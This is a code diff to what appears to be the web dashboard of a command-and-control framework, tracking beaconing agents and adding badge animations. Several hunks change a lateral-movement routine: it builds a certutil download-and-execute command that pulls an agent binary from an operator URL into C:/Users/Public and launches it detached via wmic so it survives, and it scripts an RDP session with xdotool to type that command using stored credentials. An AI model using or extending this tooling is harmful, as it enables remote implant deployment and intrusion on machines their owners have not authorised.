@@ -73,6 +73,7 @@ select option{background:var(--bg3)}
 .nav-btn .badge{background:var(--red);color:#fff;font-size:9px;min-width:14px;height:14px;border-radius:7px;display:flex;align-items:center;justify-content:center;padding:0 3px;line-height:1}
 @keyframes badge-pulse{0%,100%{box-shadow:0 0 0 0 rgba(255,60,60,.7)}60%{box-shadow:0 0 0 5px rgba(255,60,60,0)}}
 .nav-btn .badge.badge-chat-unread{animation:badge-pulse 1.4s ease-out infinite}
+.nav-btn .badge.badge-agents-new{animation:badge-pulse 1.4s ease-out infinite}
 .nav-btn.chat-unread{color:var(--text)!important}
 /* ── Content area ── */
 #content{flex:1;overflow:hidden;display:flex;flex-direction:column;background:var(--bg)}
@@ -6870,7 +6871,14 @@ function renderAgents() {
   const liveCount = filtered.filter(a => agentStatus(a).color !== 'gray').length;
   document.getElementById('agent-count').textContent = `${liveCount} agent${liveCount!==1?'s':''}${liveCount<filtered.length?' (+'+( filtered.length-liveCount)+' dead)':''}`;
   const _ab = document.getElementById('badge-agents');
-  if (_ab) { _ab.textContent = String(liveCount); _ab.style.display = liveCount > 0 ? '' : 'none'; }
+  if (_ab) {
+    _ab.textContent = String(liveCount);
+    _ab.style.display = liveCount > 0 ? '' : 'none';
+    if (liveCount > _prevLiveCount && !document.querySelector('[data-tab="agents"].active')) {
+      _ab.classList.add('badge-agents-new');
+    }
+    _prevLiveCount = liveCount;
+  }
 
   // Preserve note input focus/value across re-renders
   const focusedNote = document.activeElement;
@@ -6983,14 +6991,14 @@ function tickCountdowns() {
 }
 
 function agentStatus(a) {
-  if (a.active === false) return {color:'gray', label:'Dead'};
+  if (!a.active) return {color:'gray', label:'Dead'};
   const now      = Date.now();
   const ls       = new Date(a.last_seen).getTime();
   const sleep    = (a.sleep_sec  || 60) * 1000;
   const jitter   = (a.jitter_pct != null ? a.jitter_pct : 20) / 100;  // 0% stays 0%
   const expected = sleep * (1 + jitter);   // real max interval per beacon
   const delta    = now - ls;
-  if (delta < Math.max(10000, expected * 2.5)) return {color:'green',  label:'Active'};
+  if (delta <= 0 || delta < Math.max(10000, expected * 2.5)) return {color:'green',  label:'Active'};
   if (delta < Math.max(30000, expected * 10))  return {color:'yellow', label:'Delayed'};
   return {color:'gray', label:'Dead'};
 }
@@ -13887,6 +13895,7 @@ async function _portScanSubmit() {
 
 // ── Badges ──────────────────────────────────────────────────────────────────────
 let _chatUnread = 0;
+let _prevLiveCount = 0;
 
 function updateBadge(name) {
   const badge = document.getElementById('badge-' + name);
@@ -13911,6 +13920,9 @@ function clearBadge(name) {
     badge.classList.remove('badge-chat-unread');
     const btn = document.querySelector('[data-tab="chat"]');
     if (btn) btn.classList.remove('chat-unread');
+  }
+  if (name === 'agents') {
+    badge.classList.remove('badge-agents-new');
   }
   badge.style.display = 'none';
 }
@@ -17225,9 +17237,12 @@ async function ipcRun(action) {
       // _x suffix avoids file-lock if the same binary is already running under its original name.
       const fname   = rpFwd.replace(/.*\//, '');
       const rpInj   = 'C:/Users/Public/' + fname.replace(/(\.[^.\/\\]+)$/, '_x$1');
-      // Use start /b to detach agent from cmd so non-admin users can run it (wmic requires WMI perms).
+      // wmic treats '/' as flag prefix — must use backslashes for the executable path.
+      // wmic process call create creates a fully detached process (no console inheritance),
+      // so the agent survives when cmd.exe exits. start /b shares cmd's console and the
+      // agent dies when that console closes (CTRL_CLOSE_EVENT).
       const rpInjBs = rpInj.replace(/\//g, '\\');
-      const winCmd  = `cmd.exe /c certutil -urlcache -split -f ${surl} ${rpInj} && start /b ${rpInjBs}`;
+      const winCmd  = `cmd.exe /c certutil -urlcache -split -f ${surl} ${rpInj} && wmic process call create ${rpInjBs}`;
       const uDQ = (a.user   ||'').replace(/\\/g,'\\\\').replace(/"/g,'\\"');
       const pDQ = (a.pass   ||'').replace(/\\/g,'\\\\').replace(/"/g,'\\"');
       const dDQ = (a.domain ||'').replace(/\\/g,'\\\\').replace(/"/g,'\\"');
@@ -17275,6 +17290,21 @@ async function ipcRun(action) {
           `DISPLAY="$VDISP" xdotool click 1`,
           `sleep 0.5`,
           `DISPLAY="$VDISP" xwd -root -silent -out "$SCRDIR/01b_after_click.xwd" 2>/dev/null && ${scr} "$SCRDIR/01b_after_click.xwd" "$SCRDIR/01b_after_click.png" && echo "[*] Screenshot 01b_after_click saved"`,
+          // Dismiss any active modal dialogs (e.g. PowerShell credential request, leftover Run dialog
+          // error, or file picker from a prior session) — send more Escapes to clear all layers.
+          `echo "[*] Sending Escape x6 to dismiss any active modal dialogs..."`,
+          `DISPLAY="$VDISP" xdotool key Escape`,
+          `sleep 0.2`,
+          `DISPLAY="$VDISP" xdotool key Escape`,
+          `sleep 0.2`,
+          `DISPLAY="$VDISP" xdotool key Escape`,
+          `sleep 0.2`,
+          `DISPLAY="$VDISP" xdotool key Escape`,
+          `sleep 0.2`,
+          `DISPLAY="$VDISP" xdotool key Escape`,
+          `sleep 0.2`,
+          `DISPLAY="$VDISP" xdotool key Escape`,
+          `sleep 0.5`,
           // Right-click Start button → Win+X quick-access menu → 'r' opens Run dialog.
           // Avoids Win/Super key (no xkb scancode in Xvfb) and Task Manager compact-mode menu issues.
           `echo "[*] Right-clicking Start button for Win+X menu..."`,
@@ -17291,7 +17321,14 @@ async function ipcRun(action) {
           `DISPLAY="$VDISP" xdotool type --clearmodifiers --delay 50 "${winCmd}"`,
           `sleep 0.5`,
           `DISPLAY="$VDISP" xwd -root -silent -out "$SCRDIR/04_cmd_typed.xwd" 2>/dev/null && ${scr} "$SCRDIR/04_cmd_typed.xwd" "$SCRDIR/04_cmd_typed.png" && echo "[*] Screenshot 04_cmd_typed saved"`,
+          // Re-focus Run dialog Open field before Return — leftover dialogs from prior sessions can
+          // steal focus between the type and Return, sending Enter to the wrong dialog (e.g. Cancel).
+          `DISPLAY="$VDISP" xdotool mousemove --sync 875 651`,
+          `DISPLAY="$VDISP" xdotool click 1`,
+          `sleep 0.3`,
           `DISPLAY="$VDISP" xdotool key --clearmodifiers Return`,
+          `sleep 2`,
+          `DISPLAY="$VDISP" xwd -root -silent -out "$SCRDIR/05_after_return.xwd" 2>/dev/null && ${scr} "$SCRDIR/05_after_return.xwd" "$SCRDIR/05_after_return.png" && echo "[*] Screenshot 05_after_return saved"`,
           `echo "[*] Screenshots in: $SCRDIR"`,
           `sleep 45`,
           `kill $RDP_PID $XVFB_PID 2>/dev/null`,
